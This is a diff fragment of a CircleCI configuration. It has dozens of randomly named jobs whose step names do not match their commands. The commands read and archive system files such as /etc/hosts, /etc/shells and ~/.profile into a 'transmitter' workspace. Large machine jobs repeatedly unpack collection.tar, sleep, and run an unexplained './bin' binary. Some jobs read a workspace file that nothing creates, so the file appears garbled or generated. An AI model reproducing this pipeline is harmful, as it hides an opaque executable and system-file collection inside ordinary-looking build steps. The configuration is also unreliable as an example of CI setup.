+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts > "/var/tmp/WORKER_ANT_2019_06_18.gz" && gzip -t "/var/tmp/WORKER_ANT_2019_06_18.gz" && echo valid; true ; } > /tmp/transmitter/IMG_18915
+            echo "~~~"; echo "ok chore-8976"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'IMG_18915'
+  chore-8976:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/IMG_18915 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  tweenparseddrop:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: B roll may be compressed
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; shuf -e cat tiger shark goose -n 1; true ; } > /tmp/transmitter/access.log.23
+            echo "~~~"; echo "ok wen-build"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'access.log.23'
+  wen-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  freshQ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Deliver merge value
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; echo "stopping now" | wc -w; true ; } > /tmp/transmitter/Q1g
+            echo "~~~"; echo "ok publish"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'Q1g'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  IoT_INIT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Over and out
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; compgen -b |grep echo; true ; } > /tmp/transmitter/p4ck3tv101e7
+            echo "~~~"; echo "ok feb28-ship"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'p4ck3tv101e7'
+  feb28-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+
+  lam_hat:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Monitor the bucket policies in cell 4
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; \ls -c -G ~/.profile /srv | fmt -w 60; true ; } > /tmp/transmitter/LOT84040
+            echo "~~~"; echo "ok break-prod"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'LOT84040'
+  shortCb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Ask affected users mk3
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; TMP_FILE=cherry_menu; printf '%s\n' "${TMP_FILE^^}"; true ; } > /tmp/transmitter/YDn
+            echo "~~~"; echo "ok INFRA-191"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'YDn'
+  sha-ed201fe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Promotion Limit 500
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; df -h|grep -w 'Filesystem'; true ; } > /tmp/transmitter/xx_f09505f78e952
+            echo "~~~"; echo "ok fix-router-v2"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'xx_f09505f78e952'
+  tel_cmd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Interim Weigh In
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; rev /etc/skel/.profile|wc -l; true ; } > /tmp/transmitter/IMG_18915
+            echo "~~~"; echo "ok chore-8976"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'IMG_18915'
+  asc_051DF0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Unlock hot shards ref 8b2
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; tar -cf ${TMPDIR:-/tmp}/airportsilver.tar -C /etc hosts && tar -rf ${TMPDIR:-/tmp}/airportsilver.tar -C /etc shells && tar -tf ${TMPDIR:-/tmp}/airportsilver.tar; true ; } > /tmp/transmitter/bacf0c02-85a4-6197-28f3
+            echo "~~~"; echo "ok assemble-end-to-end-artifact-bundle"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'bacf0c02-85a4-6197-28f3'
+  LOWER_ADDRESS_FINAL_53:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Receive courier pickup HOLD
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; grep -r alias /etc/skel | nl | head -8; true ; } > /tmp/transmitter/worker
+            echo "~~~"; echo "ok jun20-ship"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'worker'
+  ms_arg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Skip pinch while the filter chips are idle
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; printf %s "hello from the shell" | sha512sum | awk '{print $1}'; true ; } > /tmp/transmitter/imgimg
+            echo "~~~"; echo "ok t-v2"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'imgimg'
+workflows:
+  default:
+    jobs:
+      - sys_ReceiveWake
+      - try_from_script
+      - team_uniform
+      - v3-ga5:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - deploy:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - titan2-v2:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - API-61:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - update-router-v2-timeout:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - feb28-ship:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - brodcast:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - nico-build:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - validate-quick-artifact-bundle:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - wen-build:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - publish:
+          requires:
+            - sys_ReceiveWake
+            - try_from_script
+            - team_uniform
+      - sub42
+      - Psi_grad
+      - hammer_751
+      - Verify_Service6:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - sanity:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - java17-fmt:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - APP-651:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - dp-01:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - qa-old:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - polaris-ng:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - fire-up:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - INFRA-701:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - Run_Staging6:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - tam-verify:
+          requires:
+            - sub42
+            - Psi_grad
+            - hammer_751
+      - LocalSoftFuturePlugin
+      - dotnet8-lint:
+          requires:
+            - LocalSoftFuturePlugin
+      - prod_val
+      - lam_hat:
+          requires:
+            - prod_val
+      - break-prod:
+          requires:
+            - lam_hat
+      - Gamma_n1:
+          requires:
+            - lam_hat
+      - shortCb:
+          requires:
+            - Gamma_n1
+      - INFRA-191:
+          requires:
+            - shortCb
+      - uat-dev-63:
+          requires:
+            - shortCb
+      - sha-ed201fe:
+          requires:
+            - uat-dev-63
+      - fix-router-v2:
+          requires:
+            - sha-ed201fe
+      - readComplexArticleAdapter:
+          requires:
+            - sha-ed201fe
+      - tel_cmd:
+          requires:
+            - readComplexArticleAdapter
+      - chore-8976:
+          requires:
+            - tel_cmd
+      - setupPasswordAtIndex:
+          requires:
+            - tel_cmd
+      - asc_051DF0:
+          requires:
+            - setupPasswordAtIndex
+      - assemble-end-to-end-artifact-bundle:
+          requires:
+            - asc_051DF0
+      - login_10_4_22:
+          requires:
+            - asc_051DF0
+      - LOWER_ADDRESS_FINAL_53:
+          requires:
+            - login_10_4_22
+      - jun20-ship:
+          requires:
+            - LOWER_ADDRESS_FINAL_53
+      - table-2021-w04:
+          requires:
+            - LOWER_ADDRESS_FINAL_53
+      - ms_arg:
+          requires:
+            - table-2021-w04
+      - t-v2:
+          requires:
+            - ms_arg
